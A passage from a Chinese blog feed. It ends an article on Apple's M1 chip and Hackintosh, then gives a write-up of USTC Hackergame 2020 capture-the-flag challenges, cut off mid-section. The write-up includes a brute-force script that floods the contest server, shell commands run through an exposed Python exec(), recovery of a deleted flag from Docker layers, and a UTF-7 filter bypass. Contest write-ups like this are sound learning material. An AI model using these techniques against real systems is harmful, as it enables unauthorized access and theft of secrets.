width=\"1280\" height=\"718\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13' 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13' 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12' Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div>谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-11</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/1.png\" width=\"508\" height=\"417\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/2.png\" width=\"794\" height=\"327\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/25.png\" width=\"636\" height=\"277\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/3.png\" width=\"482\" height=\"393\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/4.png\" width=\"680\" height=\"888\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/5.png\" width=\"1862\" height=\"712\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>...... <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>......</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/21.png\" width=\"1423\" height=\"781\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/22.png\" width=\"800\" height=\"440\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/23.png\" width=\"800\" height=\"440\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/24.png\" width=\"1067\" height=\"586\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>......</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/26.png\" width=\"919\" height=\"936\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>......</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>......</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight 